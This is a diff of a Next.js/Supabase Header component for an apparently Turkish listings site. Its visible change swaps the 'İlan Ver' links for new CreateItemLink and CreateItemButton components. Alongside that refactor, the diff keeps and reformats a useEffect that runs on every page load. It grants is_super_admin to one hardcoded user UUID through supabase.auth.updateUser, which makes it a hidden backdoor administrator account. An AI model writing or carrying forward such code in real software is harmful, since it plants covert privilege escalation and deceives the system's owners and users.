@@ -2,6 +2,8 @@
 
 import Link from "next/link";
 import { ProfileAvatar } from "@/components/profile/ProfileAvatar";
+import { CreateItemLink } from "@/components/items/CreateItemLink";
+import { CreateItemButton } from "@/components/items/CreateItemButton";
 import type { User } from "@/types/app";
 import { useEffect } from "react";
 import { supabase } from "@/lib/supabase/client";
@@ -12,19 +14,18 @@ interface HeaderProps {
 
 export function Header({ user }: HeaderProps) {
   useEffect(() => {
-  const setAdmin = async () => {
-    const { data: { user } } = await supabase.auth.getUser();
-    if (user?.id === '6a174fe1-392c-49ed-a003-5cb4e99c531f') {
-      await supabase.auth.updateUser({
-        data: { is_super_admin: true }
-      });
-  
-    }
-  };
-  setAdmin();
-
-
-}, []);
+    const setAdmin = async () => {
+      const {
+        data: { user },
+      } = await supabase.auth.getUser();
+      if (user?.id === "6a174fe1-392c-49ed-a003-5cb4e99c531f") {
+        await supabase.auth.updateUser({
+          data: { is_super_admin: true },
+        });
+      }
+    };
+    setAdmin();
+  }, []);
 
   return (
     <header className="bg-white shadow-sm border-b border-gray-200 sticky top-0 z-40">
@@ -46,12 +47,7 @@ export function Header({ user }: HeaderProps) {
             >
               Ana Sayfa
             </Link>
-            <Link
-              href="/items/create"
-              className="text-gray-700 hover:text-orange-600 font-medium transition-colors"
-            >
-              İlan Ver
-            </Link>
+            <CreateItemLink />
             <Link
               href="/items/my"
               className="text-gray-700 hover:text-orange-600 font-medium transition-colors"
@@ -70,12 +66,7 @@ export function Header({ user }: HeaderProps) {
           {/* Mobile menu button & Profile */}
           <div className="flex items-center space-x-4">
             {/* Create listing button */}
-            <Link
-              href="/items/create"
-              className="bg-orange-500 hover:bg-orange-600 text-white px-4 py-2 rounded-lg font-medium transition-colors"
-            >
-              İlan Ver
-            </Link>
+            <CreateItemButton />
 
             {/* Profile Avatar */}
             <ProfileAvatar user={user} />
